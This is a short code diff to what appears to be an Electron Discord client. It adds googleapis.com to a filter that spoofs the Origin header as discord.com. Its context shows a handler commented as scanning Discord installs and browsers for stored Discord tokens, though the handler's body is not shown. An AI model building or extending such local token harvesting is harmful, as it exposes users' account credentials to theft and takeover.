@@ -76,6 +76,7 @@ const startCore = () => {
     { urls: [
       '*://*.discord.com/*', '*://*.discord.gg/*', '*://*.discordapp.com/*',
       'wss://*.discord.com/*', 'wss://*.discord.gg/*', 'wss://*.discordapp.com/*',
+      '*://*.googleapis.com/*',
     ] },
     (details, callback) => {
       details.requestHeaders['Origin'] = 'https://discord.com';
@@ -185,6 +186,7 @@ const startCore = () => {
 
     notification.show();
   });
+
 
   // Scan Discord variants and browsers for Discord tokens (Windows only)
   ipcMain.handle('discord:getLocalTokens', async () => {
